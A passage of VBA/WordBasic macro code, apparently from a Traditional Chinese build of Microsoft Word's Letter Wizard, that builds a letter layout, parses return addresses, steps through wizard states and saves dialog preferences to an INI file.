        End If
    End If
    If WordBasic.[Right$](path$, 1) <> "\" Then path$ = path$ + "\"
    LettersPath$ = path$
    WordBasic.PrintStatusBar kLoadingLetterDetails$
LExit:
End Sub

Private Function GetDefaultUnits()
    Dim dlgTO As Object: Set dlgTO = WordBasic.DialogRecord.ToolsOptionsGeneral(False)
    WordBasic.CurValues.ToolsOptionsGeneral dlgTO
    GetDefaultUnits = dlgTO.Units
End Function

Private Function UnitName$(unit)
    Select Case unit
        Case 0
            UnitName$ = "英吋"
        Case 1
            UnitName$ = "公分"
        Case 2
            UnitName$ = "點數"
        Case 3
            UnitName$ = "pi"
        Case Else
            UnitName$ = ""
            WordBasic.PrintStatusBar "Unknown units!" 'debug only
    End Select
End Function

Private Function ConvertInchesToUnits(oldVal, newUnits)
Dim newVal
    Select Case newUnits
        Case 0: 'inches
            newVal = oldVal
        Case 1: 'cm
            newVal = oldVal * 2.54
        Case 2: 'pts
            newVal = oldVal * 72
        Case 3: 'pi
            newVal = oldVal * 6
        Case Else
            newVal = oldVal
            WordBasic.PrintStatusBar "Unknown units!"
    End Select
    ConvertInchesToUnits = newVal
End Function

Private Function ConvertUnitsToInches(oldVal, oldUnits)
Dim newVal
    Select Case oldUnits
        Case 0:     'inches
            newVal = oldVal
        Case 1:   'cm
            newVal = oldVal / 2.54
        Case 2: 'pts
            newVal = oldVal / 72
        Case 3: 'pi
            newVal = oldVal / 6
        Case Else
            newVal = oldVal
            WordBasic.PrintStatusBar "Unknown units!"
    End Select
    ConvertUnitsToInches = newVal
End Function

Private Function PrettyMeasurement$(theVal, theUnits)
Dim v
Dim u$
    If (theVal < 11) Then v = WordBasic.Int(theVal * 2 + 0.5) / 2 Else v = WordBasic.Int(theVal)
    u$ = UnitName$(theUnits)
    If theUnits > 0 Then u$ = " " + u$
    PrettyMeasurement$ = WordBasic.[LTrim$](Str(v)) + u$
End Function
        
Rem This function assumes input is in inches
Private Function RightDistanceToLeftDistance$(fromEdgeInches)
Dim fromEdgeDef
    Dim dlgPg As Object: Set dlgPg = WordBasic.DialogRecord.FilePageSetup(False)
    WordBasic.CurValues.FilePageSetup dlgPg
    fromEdgeDef = ConvertInchesToUnits(fromEdgeInches, GetDefaultUnits)
    RightDistanceToLeftDistance$ = Str(WordBasic.Val(dlgPg.PageWidth) - WordBasic.Val(dlgPg.LeftMargin) - WordBasic.Val(dlgPg.RightMargin) - fromEdgeDef)
End Function

Private Sub InsertRedSlot(s$)   'DAPFEL, Changed to a MacroButton
                        'MUST HAVE EmptyMacro macro in .wiz template
    WordBasic.ToolsOptionsView FieldCodes:=1
    WordBasic.InsertField Field:=kMacroButton$
    WordBasic.CharLeft 1
    WordBasic.Insert kEmptyMacro$
    WordBasic.Insert "["
    WordBasic.Insert s$
    WordBasic.Insert "]"
    WordBasic.CharRight 1
    WordBasic.ToolsOptionsView FieldCodes:=0
End Sub

Private Sub SubstituteBananas()
Dim v$
Dim letterIndex
Dim ii
    DoStyleMerge
    If WordBasic.ExistingBookmark("bkAddress") Then
        WordBasic.EditBookmark Name:="bkAddress", GoTo:=1
'If recipient address is same as default address(AT entry) then insert boilerplates
        v$ = WordBasic.[DlgText$]("textRecipientAddress")
        If v$ <> kAddressATEntry$ Then
            If v$ <> "" Then
                WordBasic.Insert v$
            Else
                WordBasic.EditClear 'not able to replace selected text with empty string. Text remains unchanged.
            End If
        Else
            InsertRedSlot kRecipient$
            WordBasic.InsertPara
            InsertRedSlot kEnterRecipientAddress$
        End If
    End If

    If WordBasic.ExistingBookmark("Date") Then
        WordBasic.EditBookmark Name:="Date", GoTo:=1
        WordBasic.InsertDateTime kFormalDateFormat$
    End If
    If WordBasic.ExistingBookmark("bkReturnAddress") Then
        WordBasic.EditBookmark Name:="bkReturnAddress", GoTo:=1
        WordBasic.WW6_EditClear
        If WordBasic.DlgValue("UseLetterhead") = 1 Then
            WordBasic.EditBookmark "bkReturnAddress" 'Plain Paper
        Else
            WordBasic.WW6_EditClear 'Remove Paragraph mark
        End If
    End If
    
    If WordBasic.ExistingBookmark("bkCompany") Then
        WordBasic.EditBookmark Name:="bkCompany", GoTo:=1
        WordBasic.WW6_EditClear

        If WordBasic.DlgValue("UseLetterhead") = 1 Then
            WordBasic.EditBookmark "bkCompany" 'Plain Paper
        Else
            WordBasic.WW6_EditClear 'Remove Paragraph mark
        End If
    End If

    If WordBasic.DlgValue("UseLetterhead") = 1 Then
        If WordBasic.ExistingBookmark("bkCompany") Then
            WordBasic.Style kStyCmpnyName$
            WordBasic.EditBookmark Name:="bkCompany", GoTo:=1
            InsertRedSlot kTypeCompanyName$
        End If
        If (WordBasic.DlgValue("WizStyle") = 1) Then
            WordBasic.WW7_EditAutoText Name:="cntmpgfx2", Insert:=1
        'An extra line is introduced with the insertion of AT Entry. Does not affect Resume cover letter and letter to mom, because you do not have "Company Name" style
            WordBasic.CharRight 1, 1
            WordBasic.WW6_EditClear
        Else
            WordBasic.InsertPara
        End If 'Wizstyle=1
        
        WordBasic.EditBookmark Name:="bkReturnAddress", GoTo:=1
        WordBasic.Style kStyRetAddr$
        ParseRetAddress
        If (WordBasic.DlgValue("WizStyle") <> 2) Then ' Cntmp or Prof let style
            For ii = 0 To 3
                If (RetAddress__$(ii) <> "") Then
                    WordBasic.Insert RetAddress__$(ii) + Chr(13)
                Else
                    WordBasic.Insert Chr(13)
                End If 'RetAddress...
            Next ii
            If RetAddress__$(4) <> "" Then WordBasic.Insert RetAddress__$(4)
        Else 'elegant style
            For ii = 0 To 3
                If (RetAddress__$(ii) <> "") Then
                    WordBasic.Insert RetAddress__$(ii) + " ‧ "
                Else
                    'Do Nothing
                End If 'RetAddress...
            Next ii
            If RetAddress__$(4) <> "" Then
                WordBasic.Insert RetAddress__$(4)
            Else
                WordBasic.WW6_EditClear -3 'get rid of last bullet
            End If
        End If
    End If 'LetterHead

    If WordBasic.ExistingBookmark("bkName") Then
        WordBasic.EditBookmark Name:="bkName", GoTo:=1
        InsertRedSlot kName$
    End If

    If WordBasic.ExistingBookmark("bkName2") Then
        WordBasic.EditBookmark Name:="bkName2", GoTo:=1
        If toui.Name <> "" Then
            WordBasic.Insert toui.Name
        Else
            InsertRedSlot kName$
        End If
    End If
LDone:
End Sub





Private Sub SetAddress(nm)
Dim AddressText$
Dim ix
Dim iy
Dim Ltemp$
Dim Rtemp$
    On Error GoTo -1: On Error GoTo ErrorSetAddress
    AddressText$ = WordBasic.[GetAddress$]("", "", 0, 1, 0, 0, (nm - 1), 1)
    If AddressText$ = "" Then GoTo SetAddressContinue
    ix = InStr(1, AddressText$, Chr(11))
    While ix <> 0
        iy = Len(AddressText$)
        Ltemp$ = WordBasic.[Left$](AddressText$, (ix - 1))
        Rtemp$ = WordBasic.[Right$](AddressText$, (iy - ix))
        AddressText$ = Ltemp$ + Chr(13) + Rtemp$
        ix = InStr(1, AddressText$, Chr(11))
    Wend
    iy = Len(AddressText$)
    ix = InStr(iy, AddressText$, Chr(13))
    While ix = iy
        AddressText$ = WordBasic.[Left$](AddressText$, (iy - 1))
        iy = Len(AddressText$)
        ix = InStr(iy, AddressText$, Chr(13))
    Wend
    If nm = 1 Then
        WordBasic.DlgText "textRecipientAddress", AddressText$
    ElseIf nm = 2 Then
        WordBasic.DlgText "textReturnAddress", AddressText$
    Else
        'shouldn't happen
    End If 'nm
    GoTo SetAddressContinue
ErrorSetAddress:
    'Only after getting the first MAPI load error, CommandValid ("InsertAddress") returns 0
    If nm = 1 Then 'If error is due to MAPI loading, disable buttons
        WordBasic.DlgFocus 43
        WordBasic.DlgEnable 46, 0 - WordBasic.CommandValid(kInsertAddress$)
        WordBasic.DlgEnable 47, 0 - WordBasic.CommandValid(kInsertAddress$)
    Else
        WordBasic.DlgFocus 45
        WordBasic.DlgEnable 47, 0 - WordBasic.CommandValid(kInsertAddress$)
        WordBasic.DlgEnable 46, 0 - WordBasic.CommandValid(kInsertAddress$)
    End If
    On Error GoTo -1: On Error GoTo 0
SetAddressContinue:
End Sub 'SetAddress

Private Function RmTrailingLFs$(tString$) 'nukes extra returns in a string
Dim iy
Dim ix
    iy = Len(tString$)
    If iy = 0 Then GoTo EndOfRmTrailingLFs
    ix = InStr(iy, tString$, Chr(13))
    While ix = iy
        tString$ = WordBasic.[Left$](tString$, (iy - 1))
        iy = Len(tString$)
        ix = InStr(iy, tString$, Chr(13))
    Wend
EndOfRmTrailingLFs:
    RmTrailingLFs$ = tString$
End Function

Private Sub TwoPageHack(Num) 'Hacks in a 2nd page header/footer
    WordBasic.WW7_InsertPageBreak
    WordBasic.EndOfDocument
    WordBasic.FilePageSetup DifferentFirstPage:=1
    If Num = 1 Then
        WordBasic.ViewHeader
        If (WordBasic.DlgValue("WizStyle") <> 2) Then
            WordBasic.Insert Chr(9) + Chr(9)
        Else
            WordBasic.Insert Chr(9)
        End If
        WordBasic.InsertDateTime kFormalDateFormat$
        WordBasic.ViewNormal
    End If
    If Num = 2 Then
        WordBasic.ViewFooter
        If (WordBasic.DlgValue("WizStyle") <> 2) Then
            WordBasic.Insert Chr(9) + Chr(9)
            WordBasic.InsertPageField
        Else
            WordBasic.Insert Chr(9)
            WordBasic.Insert Chr(150) + " "
            WordBasic.InsertPageField
            WordBasic.Insert " " + Chr(150)
        End If
        WordBasic.ViewNormal
    End If
    WordBasic.EditSelectAll
    WordBasic.WW6_EditClear
End Sub

Private Sub CreateLetter()
Dim recpAddress$
Dim returnAddress$
Dim T$
Dim DateTabPlace$
Dim ii
    WordBasic.PrintStatusBar kCreatingDoc$
    WordBasic.WaitCursor 1
    ' branch on letter type : shrinkwrapped or original
    recpAddress$ = WordBasic.[DlgText$]("textRecipientAddress")
    If (recpAddress$ <> "") Then WordBasic.DlgText "textRecipientAddress", RmTrailingLFs$(recpAddress$)
    returnAddress$ = WordBasic.[DlgText$]("textReturnAddress")
    If (returnAddress$ <> "") Then WordBasic.DlgText "textReturnAddress", RmTrailingLFs$(returnAddress$)

Rem ****************************************************

    If WordBasic.DlgValue("chkloDate") <> 0 Then
        TwoPageHack (1) 'Hacks in a 2nd page header/footer
    End If
    If WordBasic.DlgValue("chkloPage") <> 0 Then
        TwoPageHack (2)
        WordBasic.ViewFooter
        Select Case WordBasic.DlgValue("WizStyle")
            Case 2
                WordBasic.Insert Chr(9)
                WordBasic.Insert Chr(150) + " "
                WordBasic.InsertPageField
                WordBasic.Insert " " + Chr(150)
            Case 1
                WordBasic.Insert Chr(9) + Chr(9)
                WordBasic.InsertPageField
            Case 0
                WordBasic.Font kFntWndngs$
                WordBasic.Insert kDfltPageNum$
                WordBasic.Font kFntArial$
                WordBasic.Insert kPage$
                WordBasic.InsertPageField
        End Select
        WordBasic.ViewNormal
    End If
    If (WordBasic.DlgValue("WizStyle") = 1) And (WordBasic.DlgValue("chkloPage") = 0) Then
        WordBasic.ViewFooter
        WordBasic.Insert " "
        WordBasic.ViewNormal
    End If
    ' this is code for original letters
    WordBasic.EditSelectAll
    WordBasic.WW6_EditClear
    If WordBasic.DlgValue("UseLetterhead") = 0 Then
        T$ = WordBasic.[DlgText$]("textLetterheadSpace")
        On Error GoTo -1: On Error GoTo LBadMeasurement
        Select Case WordBasic.DlgValue("LetterHeadPosition")
            Case 0  ' at the top
                WordBasic.FilePageSetup TopMargin:=T$
            Case 1    ' on the left
                WordBasic.FilePageSetup LeftMargin:=T$
            Case 2  ' on the right
                WordBasic.FilePageSetup RightMargin:=T$
        End Select
        GoTo LDoneLetterhead
LBadMeasurement:
        WordBasic.DlgFilePreview emptyDoc$
        WordBasic.DocClose 2 'Close the working document(w/out saving)
        Stop
LDoneLetterhead:
        On Error GoTo -1: On Error GoTo 0
    End If
    WordBasic.InsertPara
'Hey, this would be a good time to figure out where the return address/date should go:
    DateTabPlace$ = RightDistanceToLeftDistance$(rtDistToLftDist) '1.25" from the right is what?
    'InsertPara'we're starting *after* return address/date (if included)
    If WordBasic.DlgValue(11) <> 1 Then 'it's not a personal letter
        WordBasic.EditBookmark "recipaddr", Add:=1
        WordBasic.Style kStyInsideAddr$
        WordBasic.Insert WordBasic.[DlgText$]("textRecipientAddress") 'includes name
        WordBasic.InsertPara
    'InsertPara  DAPFEL removed
    End If
    WordBasic.Style kStySal$
    WordBasic.Insert kDear$ '+ DlgText$("textRecipientName")
    WordBasic.EditBookmark "recipient", Add:=1
    InsertRedSlot kRecipient$
    'lenrecip = Len(kRecipient$) + 2    ' 2 for [, ]
    If WordBasic.DlgValue(11) = 1 Then WordBasic.Insert "," Else WordBasic.Insert ":"
    WordBasic.InsertPara
    If WordBasic.DlgValue("chkloID") And (WordBasic.DlgValue(11) <> 1) Then
        WordBasic.Style kStySubjLine$
        WordBasic.Insert kRE$
        InsertRedSlot kAccountID$
        WordBasic.InsertPara
    End If
    WordBasic.Style kStyBodyText$
    WordBasic.EditBookmark "letterbody", Add:=1
    InsertRedSlot kTypeHere$
    WordBasic.InsertPara
    WordBasic.FormatTabs ClearAll:=1
    WordBasic.FormatTabs Position:=DateTabPlace$, Set:=1
    WordBasic.Style "結語"
    If WordBasic.DlgValue(11) = 1 Then WordBasic.Insert kClosePersonal$ Else WordBasic.Insert kCloseBusiness$
    WordBasic.InsertPara    'space for writer's name
    If WordBasic.DlgValue(11) <> 1 Then 'if not personal
        WordBasic.InsertPara
        WordBasic.Style kStyRefIntls$
        If WordBasic.DlgValue("chkloWriterInitials") Then
            InsertRedSlot kWritersInitials$
            If WordBasic.DlgValue("chkloTypistInitials") Then WordBasic.Insert "/" Else WordBasic.InsertPara
        End If
        If WordBasic.DlgValue("chkloTypistInitials") Then
            InsertRedSlot kTypistsInitials$
            WordBasic.InsertPara
        End If
        If WordBasic.DlgValue("chkloCC") Then
            WordBasic.Style kStyCC$
            WordBasic.Insert kCC$
            InsertRedSlot kNames$
            WordBasic.InsertPara
        End If
        WordBasic.Style kStyEncl$
        If WordBasic.DlgValue("chkloEnclosures") Then
            WordBasic.Insert kEnclosures$
            InsertRedSlot kNumber$
            WordBasic.InsertPara
        End If
        If WordBasic.DlgValue("chkloAttachments") Then
            WordBasic.Insert kAttachments$ + Chr(13)
        End If
    End If 'not personal
    WordBasic.StartOfDocument  ' go back to the start
    If WordBasic.DlgValue("LetterMethod") = 1 Then 'Personal
        If WordBasic.DlgValue("WizStyle") = 1 Then 'Contemporary Style
            WordBasic.WW7_EditAutoText Name:="cntmpgfx2", Insert:=1
            WordBasic.StartOfDocument
        End If 'Contemporary Style
    Else 'if not personal
        If WordBasic.DlgValue("UseLetterhead") = 1 Then
            WordBasic.Style kStyCmpnyName$
            InsertRedSlot kTypeCompanyName$
            If (WordBasic.DlgValue("WizStyle") = 1) Then
                WordBasic.WW7_EditAutoText Name:="cntmpgfx2", Insert:=1
                WordBasic.Style kStyCmpnyName$
            Else
                WordBasic.InsertPara
            End If 'Wizstyle=1
            WordBasic.Style kStyRetAddr$
            ParseRetAddress
            If (WordBasic.DlgValue("WizStyle") <> 2) Then ' Cntmp or Prof let style
                For ii = 0 To 3
                    If (RetAddress__$(ii) <> "") Then
                        WordBasic.Insert RetAddress__$(ii) + Chr(13)
                    Else
                        WordBasic.Insert Chr(13)
                    End If 'RetAddress...
                Next ii
                If RetAddress__$(4) <> "" Then WordBasic.Insert RetAddress__$(4)
            Else 'elegant style
                For ii = 0 To 3
                    If (RetAddress__$(ii) <> "") Then
                        WordBasic.Insert RetAddress__$(ii) + " ‧ "
                    Else
                        'Do Nothing
                    End If 'RetAddress...
                Next ii
                If RetAddress__$(4) <> "" Then
                    WordBasic.Insert RetAddress__$(4)
                Else
                    WordBasic.WW6_EditClear -3 'get rid of last bullet
                End If
            End If
        End If 'LetterHead
    End If 'NotPersonal
    If WordBasic.DlgValue("chkloDate") = 1 Then
        WordBasic.Insert Chr(13)
        WordBasic.Style kStyDate$
        WordBasic.InsertDateTime kFormalDateFormat$
    End If
LPrewrittenContinue:
    WordBasic.StartOfDocument
    WordBasic.ViewPage
    WordBasic.ViewZoom AutoFit:=1
    If WordBasic.DlgValue(11) = 0 Then WordBasic.CharRight 1, 1 'select Company Name
End Sub

Private Sub PickStylePreview()
    WordBasic.StartOfDocument
    WordBasic.EditSelectAll
    WordBasic.WW6_EditClear
    DoStyleMerge
    Select Case WordBasic.DlgValue("WizStyle")
        Case 0
            WordBasic.WW7_EditAutoText kGallery$, Insert:=1
        Case 1
            If WordBasic.DlgValue("UseLetterhead") = 1 Then
                WordBasic.WW7_EditAutoText Name:="cntmpgfx2", Insert:=1
                WordBasic.StartOfDocument
            End If
            WordBasic.WW7_EditAutoText kGallery$, Insert:=1
        Case 2
            WordBasic.WW7_EditAutoText kGallery$, Insert:=1
    End Select
End Sub

Private Sub DoStyleMerge()
Dim n$
    n$ = ""
    Select Case WordBasic.DlgValue("WizStyle")
        Case 0
            n$ = proflett$
            WordBasic.FilePageSetup FooterDistance:=kFtrDist1$ + Chr(34)
        Case 1
            n$ = cntmplet$
            WordBasic.FilePageSetup FooterDistance:=kFtrDist2$ + Chr(34)
        Case 2
            n$ = eleglett$
            WordBasic.FilePageSetup FooterDistance:=kFtrDist1$ + Chr(34)
    End Select
    WordBasic.WaitCursor 1
    On Error GoTo -1: On Error GoTo LStyleMissing
    WordBasic.FormatStyleGallery Template:=n$
    WordBasic.DlgUpdateFilePreview
    GoTo LContinue1
LStyleMissing:
    WordBasic.MsgBox kErrStyleNotFound1$ + n$ + kErrStyleNotFound2$, wizname$, 48
LContinue1:
    On Error GoTo -1: On Error GoTo 0
    WordBasic.WaitCursor 0
End Sub

Private Sub ParseRetAddress()
Dim i
Dim temp$
Dim iPos
    For i = 0 To 7
        RetAddress__$(i) = ""
    Next
    i = 0
    temp$ = WordBasic.[DlgText$]("textReturnAddress")
    If temp$ <> "" Then
        iPos = InStr(temp$, Chr(13))
        While iPos And (i < 7)
            If iPos < Len(temp$) Then
                RetAddress__$(i) = WordBasic.[Left$](temp$, iPos - 1)
                temp$ = Mid(temp$, iPos + 1)
                iPos = InStr(temp$, Chr(13))
                i = i + 1
            Else
                If Len(temp$) > 1 Then
                    RetAddress__$(i) = WordBasic.[Left$](temp$, iPos - 1)
                    i = i + 1
                End If
                temp$ = ""
                iPos = 0
            End If
        Wend
        If temp$ <> "" Then
            RetAddress__$(i) = temp$
            i = i + 1
        End If
    End If

    RetAddressLines = i
End Sub


'%% NextState : Determine the next state
Private Function NextState(oldState)    'Determine state that follows oldState
Dim LetterMethod
Dim UseLetterhead
    LetterMethod = WordBasic.DlgValue(11)
    UseLetterhead = WordBasic.DlgValue("UseLetterhead")
    If oldState = 3 And UseLetterhead <> 0 And LetterMethod = 1 Then
        NextState = oldState + 3
    ElseIf oldState = 3 And UseLetterhead <> 0 Then
        NextState = oldState + 2
    ElseIf oldState = 4 And LetterMethod = 1 Then
        NextState = oldState + 2
    Else
        NextState = oldState + 1 'default
    End If
End Function 'NextState

'%% PrevState : Determine the preceding state
Private Function PrevState(oldState)
Dim LetterMethod
Dim UseLetterhead
    LetterMethod = WordBasic.DlgValue(11)
    UseLetterhead = WordBasic.DlgValue("UseLetterhead")
    If oldState = 6 And LetterMethod = 1 And UseLetterhead <> 0 Then
        PrevState = oldState - 3
    ElseIf oldState = 6 And LetterMethod = 1 Then
        PrevState = oldState - 2
    ElseIf oldState = 5 And UseLetterhead <> 0 Then
        PrevState = oldState - 2
    Else
        PrevState = oldState - 1 'Default
    End If
End Function 'PrevState

Private Sub UpdateHeadingPosition()
Dim lhpNew
Dim L$
Dim R$
Dim T$
    lhpNew = WordBasic.DlgValue("LetterHeadPosition")
    If lhpNew <> gCurrentHeadingPosition Then
        WordBasic.WaitCursor 1
        gCurrentHeadingPosition = lhpNew
        L$ = pt90_$: R$ = pt90_$: T$ = pt72_$
        Select Case gCurrentHeadingPosition
            Case 0: T$ = pt216_$
            Case 1: L$ = pt216_$
            Case 2: R$ = pt216_$
        End Select
        WordBasic.FilePageSetup TopMargin:=T$, LeftMargin:=L$, RightMargin:=R$
    PickStylePreview
    End If
End Sub

'%% DoButtonClick : Handle custom buttons (override standard buttons if necessary)
Private Function DoButtonClick(id$, item)
Dim ret
Dim letterIndex
Dim fname$
Dim x
    ret = 0 'Change value of ret when we override standard buttons (eg, "Next")
    'Note: item 6 is "Next>"
    
    If State = 3 And item > StateItems__(0) Then
        If WordBasic.DlgValue("UseLetterhead") = 0 Then
            gCurrentHeadingPosition = -69 'force change
            UpdateHeadingPosition
        Else
            WordBasic.FilePageSetup TopMargin:=pt72_$, LeftMargin:=pt90_$, RightMargin:=pt90_$
            PickStylePreview 'TEST
        End If
        WordBasic.DlgUpdateFilePreview
    End If
    If State = 4 And item > StateItems__(0) Then
        If WordBasic.DlgValue("LetterHeadPosition") <> gCurrentHeadingPosition Then
            UpdateHeadingPosition
            WordBasic.DlgUpdateFilePreview
        End If
    End If
    If State = 5 Then
        ParseRetAddress
        If RetAddressLines > 5 Then
            ret = 2
            WordBasic.DlgFocus "textReturnAddress"
            WordBasic.MsgBox kErrMaxLines$, 48
        End If 'retaddress...
    End If 'state = 5
    If State = 6 And item > StateItems__(0) Then
        PickStylePreview
        WordBasic.DlgUpdateFilePreview
    End If
LContinue:
    If item = 7 Then ' FINISH
        If RetAddressLines <= 5 Then
            CreateLetter
            x = WordBasic.DlgValue("HelpOrEnvelope")
            gEnvelopeLabel = (x = 0)
            WordBasic.CurValues.ToolsEnvelopesAndLabels dlgEL
            dlgEL.EnvAddress = WordBasic.[DlgText$]("textRecipientAddress")
            dlgEL.EnvReturn = WordBasic.[DlgText$]("textReturnAddress")
            dlgEL.AddrText = WordBasic.[DlgText$]("textRecipientAddress")
            dlgEL.ExtractAddress = 0
            ret = 1 ' This means "return from wizard now"
        Else
            ret = 2
        End If
    End If
    DoButtonClick = ret
End Function 'DoButtonClick


Private Sub ItemFocusChanged(id$, wold)
    If State = 1 Then
       If WordBasic.[Left$](id$, 5) = "optlm" Then
        WordBasic.DlgText "tip1text", WordBasic.[GetAutoText$]("tip1" + id$, 1)
       End If
    ElseIf State = 4 Then
       If Mid(id$, 3, 3) = "The" Then
        WordBasic.DlgText "tip5text", WordBasic.[GetAutoText$]("tip5" + id$, 1)
       End If
    End If
End Sub

Private Sub SaveDialog()
    WordBasic.PrintStatusBar kSaveSettings$
    SaveDlgValPref "LetterMethod"
'state 2
    SaveDlgValPref "chkloPage"
    SaveDlgValPref "chkloDate"
    SaveDlgValPref "chkloID"
    SaveDlgValPref "chkloWriterInitials"
    SaveDlgValPref "chkloTypistInitials"
    SaveDlgValPref "chkloCC"
    SaveDlgValPref "chkloEnclosures"
    SaveDlgValPref "chkloAttachments"
'3
    SaveDlgValPref "UseLetterhead"
'4
    SaveDlgValPref "LetterHeadPosition"
    SaveDlgPref "textLetterheadSpace"
'5
    SaveDlgMultiLinePref "textRecipientAddress"
    SaveDlgMultiLinePref "textReturnAddress"
'6
    SaveDlgValPref "WizStyle"
'finish
    SaveDlgValPref "HelpOrEnvelope"
End Sub

Private Sub RstDialog()
Dim A$
Dim unit
Dim kRstStylesheet$
Dim def$
    WordBasic.PrintStatusBar kRstSettings$
    RstDlgValPref "LetterMethod", 0 ' LetterMethod is id #11
    WordBasic.DlgText "tip1text", WordBasic.[GetAutoText$]("tip1optlm" + WordBasic.[LTrim$](Str(WordBasic.DlgValue(11) + 1)), 1) 'For Prewritten Letters
'state 2
    RstDlgValPref "chkloPage", 1
    RstDlgValPref "chkloDate", 1
    RstDlgValPref "chkloID", 0
    RstDlgValPref "chkloWriterInitials", 0
    RstDlgValPref "chkloTypistInitials", 0
    RstDlgValPref "chkloCC", 0
    RstDlgValPref "chkloEnclosures", 0
    RstDlgValPref "chkloAttachments", 0
'3
    RstDlgValPref "UseLetterhead", 1
'4
    RstDlgValPref "LetterHeadPosition", 0
    gCurrentHeadingPosition = -1
    Select Case WordBasic.DlgValue(StateItems__(4 - 1) + 1) 'LetterHeadPosition
        Case 0
            A$ = "AtTheTop"
        Case 1
            A$ = "OnTheLeft"
        Case 2
            A$ = "OnTheRight"
        Case Else
            WordBasic.MsgBox "Internal error (LHP bad)", wizname$, 16
    End Select
    WordBasic.DlgText "tip5text", WordBasic.[GetAutoText$]("tip5" + A$, 1)
    unit = GetDefaultUnits
    RstDlgPref "textLetterheadSpace", PrettyMeasurement$(ConvertInchesToUnits(2, unit), unit)
'5
    RstDlgMultiLinePref "textRecipientAddress", WordBasic.[GetAutoText$]("prefRecipientAddress", 1)
    RstDlgMultiLinePref "textReturnAddress", toui.Address
'6
    RstDlgValPref "WizStyle", 0
'finish
    RstDlgValPref "HelpOrEnvelope", 1
    PickStylePreview
    If WordBasic.DlgValue("UseLetterhead") = 0 Then UpdateHeadingPosition
    WordBasic.PrintStatusBar kRstStylesheet$
'======================================
    def$ = WordBasic.[GetDocumentVar$]("LetterName")
    If def$ <> "" Then      'oh, goody: Mr. Resume is bossing me around again. Joy, joy.
        WordBasic.PrintStatusBar kLookingFor$ + chQuote$ + def$ + chQuote$ + "..."
        WordBasic.DlgValue "LetterMethod", 0    'prewritten
        WordBasic.DlgText "tip1text", WordBasic.[GetAutoText$]("tip1optlm" + WordBasic.[LTrim$](Str(WordBasic.DlgValue(11) + 1)), 1) 'For Prewritten Letters
    End If
    WordBasic.PrintStatusBar ""
End Sub

'======================================================
'%% Common Wizard Routines

Private Sub VerifyEnvirons()
Dim wind$
Dim fBadDoc
    Dim howser As Object: Set howser = WordBasic.DialogRecord.ToolsOptionsGeneral(False)
    WordBasic.CurValues.ToolsOptionsGeneral howser
    gDoogie = howser.BlueScreen
    WordBasic.ToolsOptionsGeneral BlueScreen:=0
    WordBasic.ScreenUpdating 0
    WordBasic.DisableInput  'Disable ESCape (works correctly in dialog)
    wind$ = WordBasic.[FileNameFromWindow$]()
    If wind$ <> "" Then fBadDoc = 1
    If WordBasic.IsMacro() Or InStr(wind$, ".") <> 0 Then
         fBadDoc = 1
    Else
        WordBasic.EditSelectAll
        If Len(WordBasic.[Selection$]()) > 1 Then fBadDoc = 1
    End If
    If fBadDoc Then
        WordBasic.MsgBox kErrBadDoc$, kWizname$, 16
        Error 1302
    End If
'After all that, the document may still be bogus (even if we created a new one above!)
    WordBasic.EditSelectAll 'Clear it out
    WordBasic.WW6_EditClear
    workDoc$ = WordBasic.[WindowName$]()    'get name of working doc's window
    WordBasic.DisableAutoMacros 1       'make sure no macros are executed!
    On Error GoTo -1: On Error GoTo FatalError
    WordBasic.FileNewDefault            'create a new, empty window
    WordBasic.DisableAutoMacros 0       're-enable auto macros
'grab page setup options
    Dim dlgPgSetup1 As Object: Set dlgPgSetup1 = WordBasic.DialogRecord.FilePageSetup(False)
    Dim dlgPgSetup2 As Object: Set dlgPgSetup2 = WordBasic.DialogRecord.FilePageSetup(False)
    WordBasic.CurValues.FilePageSetup dlgPgSetup1
    iEmptyDoc = WordBasic.Window()      'get window # of this doc
    emptyDoc$ = WordBasic.[WindowName$]()
    iWorkDoc = 1
    While (WordBasic.[WindowName$](iWorkDoc) <> workDoc$) 'find our original window
        iWorkDoc = iWorkDoc + 1
    Wend
    WordBasic.WindowList (iWorkDoc)     'switch back to working doc
    WordBasic.CurValues.FilePageSetup dlgPgSetup2
    If dlgPgSetup1.Orientation <> dlgPgSetup2.Orientation Then 'need to swap page dimensions
        With ActiveDocument.PageSetup
            .PageWidth = CentimetersToPoints(Val(dlgPgSetup1.PageHeight))
            .PageHeight = CentimetersToPoints(Val(dlgPgSetup1.PageWidth))
        End With
    Else
        With ActiveDocument.PageSetup
            .PageWidth = CentimetersToPoints(Val(dlgPgSetup1.PageWidth))
            .PageHeight = CentimetersToPoints(Val(dlgPgSetup1.PageHeight))
        End With
    End If
    GoTo NoError

FatalError:
    WordBasic.DisableAutoMacros 0
    On Error GoTo -1: On Error GoTo 0

NoError:

End Sub

'=====================================

Private Sub xStorePref(id$, val_$)
Dim v$
    If val_$ = "" Then v$ = "~" Else v$ = val_$
    WordBasic.SetPrivateProfileString kWizname$, id$, v$, Environ("windir") + "\wordwiz.ini"
End Sub

Private Function xFetchPref$(id$)
    xFetchPref$ = WordBasic.[GetPrivateProfileString$](kWizname$, id$, Environ("windir") + "\wordwiz.ini")
End Function

Private Sub SaveDlgValPref(id$)
    xStorePref id$, Str(1 + WordBasic.DlgValue(id$))
End Sub

Private Sub RstDlgValPref(id$, defaultVal)
Dim v
Dim nerr
    v = WordBasic.Val(WordBasic.[GetPrivateProfileString$](kWizname$, id$, "wordwiz.ini")) - 1  'get the value
    If v < 0 Then v = defaultVal    'ensure legal value (unless too big...)
    On Error GoTo -1: On Error GoTo TooBig
    WordBasic.DlgValue id$, v
    GoTo rdvpexit
TooBig:
    nerr = Err.Number
    On Error GoTo -1: On Error GoTo 0
    If nerr = 9 Then    'subscript out of range ... v is too big
        WordBasic.DlgValue id$, defaultVal
    Else
        WordBasic.ScreenUpdating -1 'make sure this is turned on
        Error nerr  'report the err
    End If
rdvpexit:
End Sub

Private Sub SaveDlgPref(id$)
    xStorePref id$, WordBasic.[DlgText$](id$)
End Sub

Private Sub RstDlgPref(id$, defaultStr$)
Dim v$
    v$ = WordBasic.[GetPrivateProfileString$](kWizname$, id$, "wordwiz.ini")
    If v$ = "" Then v$ = defaultStr$
    If v$ = "~" Then v$ = ""
    WordBasic.DlgText id$, v$
End Sub

Private Sub SaveDlgMultiLinePref(id$)
Dim v$
Dim idx
Dim count_
    v$ = WordBasic.[DlgText$](id$)
    idx = InStr(v$, Chr(13))
    count_ = 1
    While (idx > 0)
        xStorePref id$ + WordBasic.[LTrim$](Str(count_)), WordBasic.[Left$](v$, idx - 1)
        If Len(v$) > idx Then v$ = Mid(v$, idx + 1) Else v$ = ""
        idx = InStr(v$, Chr(13))
        count_ = count_ + 1
    Wend
